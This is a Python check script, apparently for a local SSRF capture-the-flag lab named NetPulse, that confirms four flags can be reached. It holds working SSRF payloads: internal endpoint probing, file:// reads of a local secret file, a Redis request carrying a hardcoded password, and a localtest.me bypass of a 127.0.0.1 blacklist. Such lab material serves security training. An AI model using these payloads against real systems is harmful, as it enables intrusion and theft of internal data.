# -*- coding: utf-8 -*-
"""验证 NetPulse SSRF 靶场 4 个 FLAG 可按逻辑链获得"""
import requests, time

BASE = "http://127.0.0.1:5027"
SECRET = "file:///" + "C:/Users/clnk/WorkBuddy/2026-07-18-16-15-12/labs/netpulse_secret.txt"
REDIS_PWD = "redispass_2026"

requests.get(f"{BASE}/reset")
time.sleep(0.3)

# FLAG1: 基础内网探测
r = requests.get(f"{BASE}/monitor", params={"url": "http://127.0.0.1:5027/internal/status"})
f1 = "FLAG1" in r.text

# FLAG2: file:// 读本地文件
r = requests.get(f"{BASE}/monitor", params={"url": SECRET})
f2 = "FLAG2" in r.text

# FLAG3: 用密码打内网 Redis（密码来自 FLAG2 读到的文件）
r = requests.get(f"{BASE}/monitor", params={"url": f"http://127.0.0.1:5027/internal/redis?pwd={REDIS_PWD}"})
f3 = "FLAG3" in r.text

# FLAG4: 黑名单绕过（域名 localtest.me 解析到 127.0.0.1）
r = requests.get(f"{BASE}/safe", params={"url": "http://localtest.me:5027/internal/secret"})
f4 = "FLAG4" in r.text

# 反向验证: /safe 直连 127.0.0.1 应被拦
r = requests.get(f"{BASE}/safe", params={"url": "http://127.0.0.1:5027/internal/secret"})
block = "拦截" in r.text

print("FLAG1 基础内网探测 :", "PASS" if f1 else "FAIL")
print("FLAG2 file:// 读文件:", "PASS" if f2 else "FAIL")
print("FLAG3 串联打 Redis  :", "PASS" if f3 else "FAIL")
print("FLAG4 黑名单绕过    :", "PASS" if f4 else "FAIL")
print("反向: /safe 拦内网   :", "PASS" if block else "FAIL")
